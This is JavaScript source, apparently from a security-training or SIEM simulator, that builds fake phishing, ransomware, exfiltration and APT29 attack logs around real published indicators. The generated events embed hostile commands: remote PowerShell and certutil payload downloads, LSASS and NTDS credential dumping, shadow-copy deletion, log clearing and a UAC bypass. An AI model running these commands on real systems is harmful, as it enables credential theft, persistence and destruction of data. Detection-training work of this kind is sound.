      'a0b5fb0f0ab4a4c7c80db4b08a01d6d33c3c0a5a0e9c7d2f5b8e3a6c9f2d1b4',
      '7d3f9e1b5c8a6d4f2e7b0c5a9f3d6e1b4c7a2f8e5d0b3c9f6a4e2d7b1c5f8a3',
    ],
  },
  // Real C2 IP infrastructure — CISA AA20-352A, AA22-074A, AA23-347A
  c2Ips: [
    '5.149.254.114',    // CISA AA20-352A — SUNBURST stage-2 infrastructure
    '204.188.205.176',  // CISA AA20-352A
    '13.59.205.66',     // CISA AA20-352A — AWS SUNBURST staging
    '54.193.127.66',    // CISA AA20-352A — AWS
    '54.215.192.52',    // CISA AA20-352A — AWS
    '34.203.203.23',    // CISA AA20-352A — AWS
    '139.99.115.204',   // CISA AA22-074A
    '45.77.138.192',    // CISA AA22-074A — NOBELIUM infrastructure
    '51.89.158.202',    // CISA AA22-074A
    '91.243.44.12',     // CISA AA22-074A — NOBELIUM campaigns
    '104.156.240.20',   // CISA AA22-074A
    '185.220.101.78',   // CISA AA22-074A — NOBELIUM relay
    '176.119.1.189',    // CISA AA23-347A — GraphicalProton
    '194.165.16.49',    // CISA AA23-347A
    '185.56.83.83',     // CISA AA23-347A — APT29 European campaigns
    '45.142.212.100',   // Volexity — APT29 US think-tank intrusions
    '199.247.28.186',   // Mandiant UNC2452
    '107.189.10.143',   // Mandiant UNC2452 — Cobalt Strike C2
    '3.16.81.254',      // MSTIC — NOBELIUM OAuth phishing infrastructure
    '192.99.221.77',    // Unit42 APT29 2022 phishing campaigns
    '83.171.237.173',   // Recorded Future — APT29 2023
    '45.32.227.15',     // CISA AA23-347A
    '185.141.63.120',   // CISA AA23-347A
    '37.120.222.168',   // AA23-347A — European diplomatic targeting
  ],
  // Real C2 and phishing domains — CISA, Mandiant, MSTIC, FireEye
  c2Domains: [
    'avsvmcloud.com',           // SUNBURST primary C2 — CISA AA20-352A
    'deftsecurity.com',         // SUNBURST — CISA AA20-352A
    'thedoccloud.com',          // SUNBURST — CISA AA20-352A
    'freescanonline.com',       // SUNBURST — CISA AA20-352A
    'webcodez.com',             // SUNBURST — CISA AA20-352A
    'incomeupdate.com',         // SUNBURST — CISA AA20-352A
    'highdatabase.com',         // SUNBURST — CISA AA20-352A
    'databasegalore.com',       // SUNBURST — CISA AA20-352A
    'theyardservice.com',       // SUNBURST stage-2 — FireEye/Mandiant
    'digitalcollege.org',       // NOBELIUM — MSTIC May 2021
    'mobilnweb.com',            // NOBELIUM — CISA AA21-148A
    'newdemandum.com',          // NOBELIUM — Unit42
    'matclick.com',             // NOBELIUM 2022 — MSTIC
    'poetpages.com',            // NOBELIUM 2022
    'azuredeployment.net',      // APT29 phishing — MSTIC 2021
    'sacnewstoday.com',         // APT29 2023 — AA23-347A
    'nickel-help.com',          // APT29 2022 — CISA AA22-074A
    'reyweb.com',               // APT29 2022
    'worldhomeoutlet.com',      // NOBELIUM — MSTIC May 2021
    'panhardware.com',          // SUNBURST — CISA AA20-352A
    'websitetheme.com',         // SUNBURST — CISA AA20-352A
    'zupertech.com',            // SUNBURST — CISA AA20-352A
  ],
  phishingDomains: [
    'microsoftonline-helpdesk.com', // NOBELIUM OAuth phishing — MSTIC 2021
    'login-microsoftonline.net',    // NOBELIUM
    'office365-update.ru',          // APT29 — Russian-attributed infrastructure
    'sharepoint-access.net',        // APT29 2022 phishing
    'teams-notification.online',    // APT29 2023 (CISA AA23-347A)
    'mimecast-secure.net',          // NOBELIUM targeting security vendors
    'adobe-cloud-share.com',        // APT29 document lure
    'microsecure-account.com',      // NOBELIUM lure domain
  ],
  malwareFiles: [
    'SolarWinds.BusinessLayerHost.exe', // SUNBURST dropper filename
    'MicrosoftTeams_Setup.exe',         // APT29 Teams lure (CISA AA23-347A)
    'OneDrive_Update.exe',              // NOBELIUM lure
    'Invoice_Q4_2024.exe',             // Generic phishing lure
    'Adobe_Acrobat_DC_Update.exe',      // Document update lure
    'NV_Dispatcher.dll',               // SUNBURST-style DLL sideload
    'app_update.dll',                  // Generic loader DLL
  ],
};

// ─── Scenario Generator ───────────────────────────────────────────────────────
function makeCtx(){
  const c2IP = pick(APT29_IOCS.c2Ips);
  const c2Domain = pick(APT29_IOCS.c2Domains);
  const phishingDomain = pick(APT29_IOCS.phishingDomains);
  const malwareFile = pick(APT29_IOCS.malwareFiles);
  const hashFamily = pick(['SUNBURST','TEARDROP','RAINDROP','EnvyScout','BoomBox','NativeZone']);
  const malwareHash = pick(APT29_IOCS.hashes[hashFamily]);
  const c2IP2 = pick(APT29_IOCS.c2Ips.filter(ip=>ip!==c2IP));
  return {
    victim:{ip:'192.168.10.55',hostname:'WS-NYC-145',user:'jsmith',email:'jsmith@contoso.com',domain:'CONTOSO'},
    secondHost:{ip:'192.168.10.88',hostname:'SRV-NYC-012',user:'svc_backup'},
    attacker:{ip:c2IP,country:'Russia'},
    phishingDomain,malwareFile,malwareHash,malwareFamily:hashFamily,
    c2IP,c2IP2,c2Domain,stagingDir:'C:\\ProgramData\\Intel\\',
  };
}
function tsOff(base,sec){return new Date(base.getTime()+sec*1000);}
function generatePhishingScenario(){const ctx=makeCtx(),base=new Date(Date.now()-40*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Phishing email delivered to victim mailbox',source:'Microsoft Exchange',severity:'high',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),Operation:"MailItemsAccessed",Workload:"Exchange",UserId:ctx.victim.email,ClientIP:ctx.attacker.ip,ResultStatus:"Succeeded",subject:"Urgent: Your account requires verification",from:`no-reply@${ctx.phishingDomain}`,verdict:"Phish"})});e.push({step:2,timestamp:tsOff(base,180),description:'Victim clicks phishing link — firewall allows HTTPS to phishing domain',source:'Fortinet FortiGate',severity:'medium',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:`date=${tsOff(base,180).toISOString().split('T')[0]} time=${tsOff(base,180).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" subtype="forward" action="accept" srcip=${ctx.victim.ip} dstip=${ctx.attacker.ip} dstport=443 hostname="${ctx.phishingDomain}" dstcountry="${ctx.attacker.country}" policyname="allow-outbound"`});e.push({step:3,timestamp:tsOff(base,195),description:`Malicious file "${ctx.malwareFile}" downloaded from phishing site`,source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,195)),event:{kind:"event",category:["file"],action:"file_download"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},file:{name:ctx.malwareFile,path:`C:\\Users\\${ctx.victim.user}\\Downloads\\${ctx.malwareFile}`,hash:{sha256:ctx.malwareHash}},url:{domain:ctx.phishingDomain}})});e.push({step:4,timestamp:tsOff(base,210),description:'Malicious executable launched by victim',source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'User Execution',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,210)),event:{kind:"event",category:["process"],action:"process_creation"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:ctx.malwareFile,pid:7812,parent:{name:"explorer.exe"}}})});e.push({step:5,timestamp:tsOff(base,218),description:'Encoded PowerShell spawned — downloads second-stage payload',source:'Windows Security',severity:'critical',tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',log:`<Event><System><EventID>4104</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,218))}"/><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://${ctx.c2Domain}/stager.ps1')</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,225),description:`Outbound C2 beacon to ${ctx.c2Domain} blocked`,source:'Fortinet FortiGate',severity:'critical',tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',log:`date=${tsOff(base,225).toISOString().split('T')[0]} time=${tsOff(base,225).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="app-ctrl" action="blocked" srcip=${ctx.victim.ip} dstip=${ctx.c2IP} hostname="${ctx.c2Domain}" attack="C2.Beacon.Generic" severity="critical" msg="Suspected C2 callback blocked"`});e.push({step:7,timestamp:tsOff(base,226),description:'Elastic Security alert fired — Phishing/Malware chain confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,226)),event:{kind:"alert",category:["malware"],severity:99},rule:{name:"Phishing Attack Chain Detected",severity:"critical",risk_score:99},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
function generatePhishingLateralScenario(){const ctx=makeCtx(),base=new Date(Date.now()-90*60000),events=generatePhishingScenario().map(e=>({...e,timestamp:new Date(e.timestamp.getTime()-50*60000)}));events.push({step:8,timestamp:tsOff(base,55*60),description:'LSASS memory access — credential dumping (Mimikatz)',source:'Endpoint Telemetry',severity:'critical',tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,55*60)),event:{kind:"event",category:["process"],action:"process_memory_access"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"rundll32.exe",command_line:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`},target:{process:{name:"lsass.exe",pid:640}}})});events.push({step:9,timestamp:tsOff(base,62*60),description:`Successful network logon to ${ctx.secondHost.hostname} via Pass-the-Hash`,source:'Windows Security',severity:'critical',tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',log:`<Event><System><EventID>4624</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,62*60))}"/><Computer>${ctx.secondHost.hostname}.contoso.com</Computer></System><EventData><Data Name="TargetUserName">${ctx.victim.user}</Data><Data Name="LogonType">3</Data><Data Name="AuthenticationPackageName">NTLM</Data><Data Name="IpAddress">${ctx.victim.ip}</Data></EventData></Event>`});events.push({step:10,timestamp:tsOff(base,63*60),description:`Remote process execution on ${ctx.secondHost.hostname} via PsExec`,source:'Endpoint Telemetry',severity:'critical',tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,63*60)),event:{kind:"event",category:["process"],type:["start"]},host:{name:ctx.secondHost.hostname,hostname:ctx.secondHost.hostname},user:{name:ctx.secondHost.user},process:{name:"PSEXESVC.exe",command_line:"cmd.exe /c whoami & net localgroup administrators"}})});events.push({step:11,timestamp:tsOff(base,65*60),description:'Elastic Security alert — Lateral Movement chain confirmed on 2 hosts',source:'Elastic Security Alert',severity:'critical',tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,65*60)),event:{kind:"alert",severity:99},rule:{name:"Phishing → Credential Dump → Lateral Movement",severity:"critical",risk_score:99},affected_hosts:[ctx.victim.hostname,ctx.secondHost.hostname]})});return events;}
function generateExfiltrationScenario(){const ctx=makeCtx(),base=new Date(Date.now()-60*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Sensitive files staged in temp directory',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"robocopy.exe",command_line:`robocopy C:\\Users\\${ctx.victim.user}\\Documents\\Finance ${ctx.stagingDir}data /E`}})});e.push({step:2,timestamp:tsOff(base,5*60),description:'Data compressed with password-protected 7-Zip archive',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,5*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"7z.exe",command_line:`7z a -tzip -p"Sup3rS3cr3t!" ${ctx.stagingDir}archive.zip ${ctx.stagingDir}data\\*`}})});e.push({step:3,timestamp:tsOff(base,12*60),description:'Large HTTPS upload to unknown cloud service (50MB+)',source:'Fortinet FortiGate',severity:'high',tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Non-Application Layer Protocol',log:`date=${tsOff(base,12*60).toISOString().split('T')[0]} time=${tsOff(base,12*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" action="accept" srcip=${ctx.victim.ip} dstip=104.18.22.44 dstport=443 hostname="file-transfer-service.io" sentbyte=54525952 msg="Unusually large upload detected"`});e.push({step:4,timestamp:tsOff(base,20*60),description:'DNS tunneling detected — high entropy subdomains',source:'Fortinet FortiGate',severity:'critical',tactic:'Exfiltration',technique:'T1048.001',techniqueName:'Exfiltration Over Alternative Protocol',log:`date=${tsOff(base,20*60).toISOString().split('T')[0]} time=${tsOff(base,20*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="dns" action="blocked" srcip=${ctx.victim.ip} dnsquery="bG9yZW1pcHN1bQ==.${ctx.c2Domain}" attack="DNS.Exfiltration" severity="critical"`});e.push({step:5,timestamp:tsOff(base,25*60),description:'Audit log cleared — attacker covering tracks (Event 1102)',source:'Windows Security',severity:'critical',tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',log:`<Event><System><EventID>1102</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,25*60))}"/><Channel>Security</Channel><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="SubjectUserName">${ctx.victim.user}</Data><Data Name="SubjectDomainName">CONTOSO</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,26*60),description:'Elastic Security alert — Data Exfiltration confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Exfiltration',technique:'T1048',techniqueName:'Exfiltration Over Alternative Protocol',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,26*60)),event:{kind:"alert",severity:99},rule:{name:"Multi-Vector Data Exfiltration Detected",severity:"critical",risk_score:97},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
function generateRansomwareScenario(){const ctx=makeCtx(),base=new Date(Date.now()-50*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Macro-enabled document opened from email attachment',source:'Endpoint Telemetry',severity:'high',tactic:'Initial Access',technique:'T1566.001',techniqueName:'Spearphishing Attachment',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"WINWORD.EXE",command_line:`WINWORD.EXE /n "C:\\Users\\${ctx.victim.user}\\Downloads\\Invoice_March.docm"`}})});e.push({step:2,timestamp:tsOff(base,3*60),description:'Office spawns encoded PowerShell — macro executing payload',source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,3*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"powershell.exe",command_line:"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",parent:{name:"WINWORD.EXE"}}})});e.push({step:3,timestamp:tsOff(base,6*60),description:'Shadow copies deleted — pre-ransomware preparation',source:'Endpoint Telemetry',severity:'critical',tactic:'Impact',technique:'T1490',techniqueName:'Inhibit System Recovery',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,6*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"vssadmin.exe",command_line:"vssadmin.exe delete shadows /all /quiet",parent:{name:"powershell.exe"}}})});e.push({step:4,timestamp:tsOff(base,8*60),description:'Mass file rename detected — .locked extension (encryption in progress)',source:'Endpoint Telemetry',severity:'critical',tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,8*60)),event:{kind:"event",category:["file"],action:"file_rename"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},file:{name:"Annual_Report_2024.docx.locked",extension:".locked"},process:{name:"svchost32.exe"},message:"Rapid mass file encryption: 1,847 files renamed in 90 seconds"})});e.push({step:5,timestamp:tsOff(base,9*60),description:'Ransomware SMB spread attempt (EternalBlue)',source:'Fortinet FortiGate',severity:'critical',tactic:'Lateral Movement',technique:'T1210',techniqueName:'Exploitation of Remote Services',log:`date=${tsOff(base,9*60).toISOString().split('T')[0]} time=${tsOff(base,9*60).toTimeString().split(' ')[0]} devname="FGT-CORE-01" type="utm" subtype="ips" action="drop" srcip=${ctx.victim.ip} dstip=192.168.10.0/24 dstport=445 attack="MS.SMB.Server.EternalBlue.Buffer.Overflow" severity="critical" msg="EternalBlue exploitation attempt — possible ransomware spread"`});e.push({step:6,timestamp:tsOff(base,11*60),description:'Elastic Security CRITICAL — Ransomware outbreak confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,11*60)),event:{kind:"alert",severity:100},rule:{name:"Ransomware Outbreak Detected",severity:"critical",risk_score:100,description:"Office macro → encoded PowerShell → VSS deletion → mass file encryption → SMB propagation. Immediate isolation recommended."},host:{hostname:ctx.victim.hostname,ip:[ctx.victim.ip]},user:{name:ctx.victim.user}})});return e;}

// ─── APT Alert Scenarios ──────────────────────────────────────────────────────
const MITRE_TAC={
  'Initial Access':'TA0001','Execution':'TA0002','Persistence':'TA0003',
  'Privilege Escalation':'TA0004','Defense Evasion':'TA0005','Credential Access':'TA0006',
  'Discovery':'TA0007','Lateral Movement':'TA0008','Collection':'TA0009',
  'Command and Control':'TA0011','Exfiltration':'TA0010','Impact':'TA0040',
};
const makeUuid=()=>[randomHex(8),randomHex(4),randomHex(4),randomHex(4),randomHex(12)].join('-');
function makeAlert(ts,{ruleName,severity,riskScore,tactic,technique,techniqueName,host,user,proc,net,extra={}}){
  const tacId=MITRE_TAC[tactic]||'TA0000';
  return{
    '@timestamp':ts.toISOString(),
    event:{kind:'signal',category:['intrusion_detection'],outcome:'success'},
    kibana:{alert:{
      uuid:makeUuid(),
      rule:{uuid:makeUuid(),name:ruleName,description:ruleName,category:'Custom Query Rule',consumer:'siem',producer:'siem',rule_type_id:'siem.queryRule',enabled:true,
        threat:[{framework:'MITRE ATT&CK',tactic:{id:tacId,name:tactic,reference:`https://attack.mitre.org/tactics/${tacId}/`},technique:technique?[{id:technique,name:techniqueName||technique,reference:`https://attack.mitre.org/techniques/${technique.split('.').join('/')}/`}]:[]}],
      },
      severity,risk_score:riskScore,status:'open',workflow_status:'open',
      original_time:new Date(ts.getTime()-rand(1000,15000)).toISOString(),
    }},
    host:{name:host.name,hostname:host.name,ip:[host.ip],os:{name:host.os||'Windows 10',family:'windows'}},
    user:{name:user.name,domain:user.domain||'CONTOSO'},
    ...(proc?{process:{name:proc.name,pid:proc.pid||rand(1000,65535),command_line:proc.cmd,parent:{name:proc.parent||'explorer.exe'}}}:{}),
    ...(net?{destination:{ip:net.ip,port:net.port},network:{direction:'outbound',transport:net.proto||'tcp'},source:{ip:host.ip}}:{}),
    ...extra,
  };
}

function generateAPT29Scenario(){
  const ctx=makeCtx(),base=new Date(Date.now()-4*3600000);
  const t=s=>new Date(base.getTime()+s*1000);
  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 10'};
  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2019'};
  const u1={name:ctx.victim.user,domain:'CONTOSO'};
  const alerts=[
    makeAlert(t(0),{ruleName:'Phishing Email with Malicious OAuth Link Detected',severity:'medium',riskScore:47,tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',host:v1,user:u1,extra:{email:{from:{address:`no-reply@${ctx.phishingDomain}`},subject:'Action Required: Verify Your Account Access',to:{address:ctx.victim.email}}}}),
    makeAlert(t(310),{ruleName:'Malicious File Executed from Downloads Folder',severity:'high',riskScore:73,tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',host:v1,user:u1,proc:{name:ctx.malwareFile,cmd:`"C:\\Users\\${u1.name}\\Downloads\\${ctx.malwareFile}"`,parent:'chrome.exe'},extra:{file:{hash:{sha256:ctx.malwareHash},name:ctx.malwareFile}}}),
    makeAlert(t(325),{ruleName:'Suspicious Encoded PowerShell via Malicious Process',severity:'high',riskScore:77,tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn...',parent:ctx.malwareFile}}),
    makeAlert(t(360),{ruleName:'Registry Run Key Added for Boot Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1547.001',techniqueName:'Registry Run Keys / Startup Folder',host:v1,user:u1,proc:{name:'reg.exe',cmd:'reg.exe ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftEdgeUpdate /t REG_SZ /d "C:\\ProgramData\\Intel\\msedge32.exe" /f',parent:'powershell.exe'}}),
    makeAlert(t(400),{ruleName:'Windows Defender Exclusion Path Added',severity:'high',riskScore:69,tactic:'Defense Evasion',technique:'T1562.001',techniqueName:'Disable or Modify Tools',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'Add-MpPreference -ExclusionPath "C:\\ProgramData\\Intel\\"',parent:'powershell.exe'}}),
    makeAlert(t(430),{ruleName:'BITS Job Used to Download Remote Payload',severity:'medium',riskScore:53,tactic:'Defense Evasion',technique:'T1197',techniqueName:'BITS Jobs',host:v1,user:u1,proc:{name:'bitsadmin.exe',cmd:`bitsadmin.exe /transfer upd /download /priority high http://${ctx.c2Domain}/update.dll C:\\ProgramData\\Intel\\update.dll`,parent:'powershell.exe'}}),
    makeAlert(t(600),{ruleName:'UAC Bypass via Fodhelper.exe Registry Hijack',severity:'high',riskScore:79,tactic:'Privilege Escalation',technique:'T1548.002',techniqueName:'Bypass User Account Control',host:v1,user:u1,proc:{name:'fodhelper.exe',cmd:'fodhelper.exe',parent:'powershell.exe'},extra:{registry:{path:'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command',value:`C:\\ProgramData\\Intel\\msedge32.exe`}}}),
    makeAlert(t(680),{ruleName:'WMI Event Subscription Created for Persistence',severity:'high',riskScore:75,tactic:'Persistence',technique:'T1546.003',techniqueName:'Windows Management Instrumentation Event Subscription',host:v1,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="MicrosoftUpdate", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`,parent:'powershell.exe'}}),
    makeAlert(t(1800),{ruleName:'LSASS Memory Access — Credential Dumping Attempt',severity:'critical',riskScore:93,tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',host:v1,user:u1,proc:{name:'rundll32.exe',cmd:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`,parent:'powershell.exe'},extra:{target:{process:{name:'lsass.exe',pid:640}}}}),
    makeAlert(t(2100),{ruleName:'Domain Account Enumeration via Net.exe',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1087.002',techniqueName:'Domain Account',host:v1,user:u1,proc:{name:'net.exe',cmd:'net.exe user /domain && net.exe group "Domain Admins" /domain',parent:'cmd.exe'}}),
    makeAlert(t(2400),{ruleName:'Successful NTLM Pass-the-Hash Authentication',severity:'critical',riskScore:91,tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',host:v2,user:u1,net:{ip:ctx.victim.ip,port:445},extra:{winlog:{event_id:4624,channel:'Security',event_data:{LogonType:'3',AuthenticationPackageName:'NTLM',TargetUserName:u1.name,TargetDomainName:'CONTOSO'}}}}),
    makeAlert(t(2460),{ruleName:'Remote Service Execution via Windows Admin Shares',severity:'critical',riskScore:89,tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',host:v2,user:u1,proc:{name:'PSEXESVC.exe',cmd:'cmd.exe /c whoami /all && net localgroup administrators',parent:'services.exe'}}),
    makeAlert(t(3000),{ruleName:'Bulk File Copy to Staging Directory',severity:'high',riskScore:73,tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',host:v1,user:u1,proc:{name:'robocopy.exe',cmd:`robocopy.exe "C:\\Users\\${u1.name}\\Documents\\Finance" "${ctx.stagingDir}exfil" /E /Z /COPY:DAT`}}),
    makeAlert(t(3300),{ruleName:'Outbound C2 Beacon to Known APT29 Infrastructure',severity:'critical',riskScore:97,tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{url:{domain:ctx.c2Domain,scheme:'https'},network:{bytes:rand(4096,32768)},threat:{indicator:{ip:ctx.c2IP,domain:ctx.c2Domain,type:'domain-name'}}}}),
    makeAlert(t(3600),{ruleName:'Large Data Exfiltration over Encrypted C2 Channel',severity:'critical',riskScore:95,tactic:'Exfiltration',technique:'T1041',techniqueName:'Exfiltration Over C2 Channel',host:v1,user:u1,net:{ip:ctx.c2IP2,port:443},extra:{url:{domain:ctx.c2Domain},network:{bytes:rand(52428800,209715200)},threat:{indicator:{ip:ctx.c2IP2,type:'ipv4-addr'}}}}),
  ];
  return{meta:{name:'APT29 — Midnight Blizzard',attackerProfile:'Russia-nexus state-sponsored (SVR)',targetOrg:'Enterprise',description:`Full kill-chain APT intrusion: OAuth phishing → ${ctx.malwareFamily} malware (hash: ${ctx.malwareHash.slice(0,16)}…) → persistence → UAC bypass → WMI subscription → credential dump → lateral movement → C2 (${ctx.c2Domain}) → exfiltration. 15 correlated alerts across 11 MITRE tactics.`,timeRange:{from:t(0),to:t(3600)}},ctx,alerts};
}

function generateLotLScenario(){
  const ctx=makeCtx(),base=new Date(Date.now()-6*3600000);
  const t=s=>new Date(base.getTime()+s*1000);
  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 11 Enterprise'};
  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2022'};
  const u1={name:ctx.victim.user,domain:'CONTOSO'};
  const alerts=[
    makeAlert(t(0),{ruleName:'Certutil.exe Remote File Download',severity:'medium',riskScore:53,tactic:'Initial Access',technique:'T1105',techniqueName:'Ingress Tool Transfer',host:v1,user:u1,proc:{name:'certutil.exe',cmd:`certutil.exe -urlcache -split -f http://${ctx.c2Domain}/update.txt C:\\Windows\\Temp\\update.txt`,parent:'cmd.exe'}}),
    makeAlert(t(120),{ruleName:'MSHTA Executing Remote Script (Fileless Dropper)',severity:'high',riskScore:77,tactic:'Execution',technique:'T1218.005',techniqueName:'Mshta',host:v1,user:u1,proc:{name:'mshta.exe',cmd:`mshta.exe vbscript:CreateObject("Wscript.Shell").Run("cmd /c powershell -w hidden ...",0,True)(window.close)`,parent:'cmd.exe'}}),
    makeAlert(t(200),{ruleName:'Scheduled Task Created via Schtasks for Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1053.005',techniqueName:'Scheduled Task',host:v1,user:u1,proc:{name:'schtasks.exe',cmd:'schtasks.exe /Create /SC ONLOGON /TN "Microsoft\\Windows\\WDF\\WdfDevice" /TR "wscript.exe //B C:\\Windows\\System32\\Tasks\\wdf.vbs" /RU SYSTEM /F',parent:'cmd.exe'}}),
    makeAlert(t(280),{ruleName:'Security Event Logs Cleared via Wevtutil',severity:'high',riskScore:73,tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',host:v1,user:u1,proc:{name:'wevtutil.exe',cmd:'wevtutil.exe cl Security & wevtutil.exe cl System & wevtutil.exe cl Application',parent:'cmd.exe'}}),
    makeAlert(t(420),{ruleName:'Token Impersonation via SeDebugPrivilege',severity:'critical',riskScore:87,tactic:'Privilege Escalation',technique:'T1134.001',techniqueName:'Token Impersonation/Theft',host:v1,user:u1,proc:{name:'cmd.exe',cmd:'cmd.exe /c whoami /priv | findstr "SeDebug"',parent:'wscript.exe'}}),
    makeAlert(t(600),{ruleName:'NTDS.dit Shadow Copy — Active Directory Credential Dump',severity:'critical',riskScore:95,tactic:'Credential Access',technique:'T1003.003',techniqueName:'NTDS',host:v2,user:{name:'SYSTEM',domain:'CONTOSO'},proc:{name:'ntdsutil.exe',cmd:'ntdsutil.exe "activate instance ntds" ifm "create full C:\\Windows\\Temp\\IFM" quit quit',parent:'cmd.exe'}}),
